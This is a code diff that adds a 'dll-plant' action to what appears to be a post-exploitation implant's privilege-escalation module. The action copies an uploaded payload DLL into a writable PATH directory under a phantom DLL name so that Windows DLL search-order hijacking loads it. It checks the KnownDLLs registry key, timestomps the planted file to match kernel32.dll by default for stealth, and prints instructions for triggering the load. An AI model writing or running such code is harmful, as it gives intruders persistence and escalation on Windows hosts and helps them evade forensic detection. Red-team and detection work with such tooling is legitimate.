@@ -27,7 +27,11 @@ func (c *PrivescCheckCommand) Description() string {
 }
 
 type privescCheckArgs struct {
-	Action string `json:"action"`
+	Action    string `json:"action"`
+	Source    string `json:"source"`
+	TargetDir string `json:"target_dir"`
+	DLLName   string `json:"dll_name"`
+	Timestomp *bool  `json:"timestomp,omitempty"`
 }
 
 func (c *PrivescCheckCommand) Execute(task structs.Task) structs.CommandResult {
@@ -60,8 +64,10 @@ func (c *PrivescCheckCommand) Execute(task structs.Task) structs.CommandResult {
 		return winPrivescCheckUAC()
 	case "dll-hijack":
 		return winPrivescCheckDLLHijack()
+	case "dll-plant":
+		return winDLLPlant(args)
 	default:
-		return errorf("Unknown action: %s. Use: all, privileges, services, registry, writable, unattend, uac, dll-hijack", args.Action)
+		return errorf("Unknown action: %s. Use: all, privileges, services, registry, writable, unattend, uac, dll-hijack, dll-plant", args.Action)
 	}
 }
 
@@ -670,6 +676,153 @@ func winPrivescCheckDLLHijack() structs.CommandResult {
 	} else {
 		sb.WriteString("  (could not read KnownDLLs registry key)\n")
 	}
+
+	return successResult(sb.String())
+}
+
+// winDLLPlant places a DLL in a target directory for DLL search order hijacking (T1574.001).
+// The operator uploads a Fawkes DLL payload to the target first, then uses this action
+// to copy it with the correct phantom DLL name into a writable PATH directory.
+func winDLLPlant(args privescCheckArgs) structs.CommandResult {
+	if args.Source == "" {
+		return errorResult("Error: 'source' is required — path to the DLL file on target (upload it first)")
+	}
+	if args.TargetDir == "" {
+		return errorResult("Error: 'target_dir' is required — writable directory to plant the DLL in (use dll-hijack to find)")
+	}
+	if args.DLLName == "" {
+		return errorResult("Error: 'dll_name' is required — name for the planted DLL (e.g. 'fveapi.dll')")
+	}
+
+	// Ensure DLL name has .dll extension
+	dllName := args.DLLName
+	if !strings.HasSuffix(strings.ToLower(dllName), ".dll") {
+		dllName += ".dll"
+	}
+
+	// Resolve paths
+	srcPath, err := filepath.Abs(args.Source)
+	if err != nil {
+		return errorf("Error resolving source path: %v", err)
+	}
+	targetDir, err := filepath.Abs(args.TargetDir)
+	if err != nil {
+		return errorf("Error resolving target directory: %v", err)
+	}
+
+	// Validate source exists and is readable
+	srcInfo, err := os.Stat(srcPath)
+	if err != nil {
+		return errorf("Source DLL not found: %v. Upload the DLL to the target first.", err)
+	}
+	if srcInfo.IsDir() {
+		return errorResult("Error: source path is a directory, not a file")
+	}
+
+	// Validate target directory exists
+	dirInfo, err := os.Stat(targetDir)
+	if err != nil {
+		return errorf("Target directory not found: %v", err)
+	}
+	if !dirInfo.IsDir() {
+		return errorResult("Error: target_dir is not a directory")
+	}
+
+	// Check write access
+	if !isDirWritable(targetDir) {
+		return errorf("Error: target directory '%s' is not writable", targetDir)
+	}
+
+	destPath := filepath.Join(targetDir, dllName)
+
+	// Check if target already exists
+	if existInfo, err := os.Stat(destPath); err == nil {
+		return errorf("Warning: '%s' already exists (%s, %s). Remove it first or choose a different name.",
+			destPath, formatFileSize(existInfo.Size()), existInfo.ModTime().Format("2006-01-02 15:04:05"))
+	}
+
+	// Check against KnownDLLs — these cannot be hijacked
+	systemRoot := os.Getenv("SystemRoot")
+	if systemRoot == "" {
+		systemRoot = `C:\Windows`
+	}
+	sys32Path := filepath.Join(systemRoot, "System32", dllName)
+	if _, err := os.Stat(sys32Path); err == nil {
+		// DLL exists in System32 — check if it's in KnownDLLs
+		knownDLLCount := countRegValues(windows.HKEY_LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`)
+		if knownDLLCount > 0 {
+			// Read each value to check if our DLL is protected
+			var knownKey windows.Handle
+			knownPath, _ := windows.UTF16PtrFromString(`SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`)
+			if windows.RegOpenKeyEx(windows.HKEY_LOCAL_MACHINE, knownPath, 0, windows.KEY_READ, &knownKey) == nil {
+				defer windows.RegCloseKey(knownKey)
+				for i := uint32(0); i < uint32(knownDLLCount); i++ {
+					var valName [256]uint16
+					valNameLen := uint32(len(valName))
+					var data [512]byte
+					dataLen := uint32(len(data))
+					var dataType uint32
+					procRegEnumValue := windows.NewLazySystemDLL("advapi32.dll").NewProc("RegEnumValueW")
+					r1, _, _ := procRegEnumValue.Call(
+						uintptr(knownKey),
+						uintptr(i),
+						uintptr(unsafe.Pointer(&valName[0])),
+						uintptr(unsafe.Pointer(&valNameLen)),
+						0,
+						uintptr(unsafe.Pointer(&dataType)),
+						uintptr(unsafe.Pointer(&data[0])),
+						uintptr(unsafe.Pointer(&dataLen)),
+					)
+					if r1 != 0 {
+						break
+					}
+					knownDLL := windows.UTF16ToString((*[256]uint16)(unsafe.Pointer(&data[0]))[:dataLen/2])
+					if strings.EqualFold(knownDLL, dllName) {
+						return errorf("Error: '%s' is in the KnownDLLs registry — Windows loads it directly from System32, bypassing search order. This DLL cannot be hijacked.", dllName)
+					}
+				}
+			}
+		}
+	}
+
+	// Copy the DLL
+	srcData, err := os.ReadFile(srcPath)
+	if err != nil {
+		return errorf("Error reading source DLL: %v", err)
+	}
+
+	if err := os.WriteFile(destPath, srcData, 0644); err != nil {
+		return errorf("Error writing DLL to target: %v", err)
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("[+] DLL planted successfully\n"))
+	sb.WriteString(fmt.Sprintf("    Source:  %s (%s)\n", srcPath, formatFileSize(srcInfo.Size())))
+	sb.WriteString(fmt.Sprintf("    Target:  %s\n", destPath))
+
+	// Timestomp: match kernel32.dll modification time for stealth
+	doTimestomp := args.Timestomp == nil || *args.Timestomp // default true
+	if doTimestomp {
+		refPath := filepath.Join(systemRoot, "System32", "kernel32.dll")
+		if refInfo, refErr := os.Stat(refPath); refErr == nil {
+			refTime := refInfo.ModTime()
+			if tsErr := os.Chtimes(destPath, refTime, refTime); tsErr == nil {
+				sb.WriteString(fmt.Sprintf("    Timestomp: matched kernel32.dll (%s)\n", refTime.Format("2006-01-02 15:04:05")))
+			} else {
+				sb.WriteString(fmt.Sprintf("    Timestomp: failed (%v)\n", tsErr))
+			}
+		}
+	}
+
+	// Provide trigger guidance
+	sb.WriteString("\n--- Trigger Guidance ---\n")
+	sb.WriteString("The planted DLL will be loaded when a process searches for it via DLL search order.\n")
+	sb.WriteString("Common triggers:\n")
+	sb.WriteString("  1. Service restart:  sc stop <ServiceName> && sc start <ServiceName>\n")
+	sb.WriteString("  2. Application launch: Run any app that loads this DLL from PATH\n")
+	sb.WriteString("  3. System reboot: Services that load the DLL will pick it up on next boot\n")
+	sb.WriteString("  4. LOLBin load:  rundll32 " + destPath + ",Run\n")
+	sb.WriteString("\nCleanup: securedelete " + destPath + "\n")
 
 	return successResult(sb.String())
 }
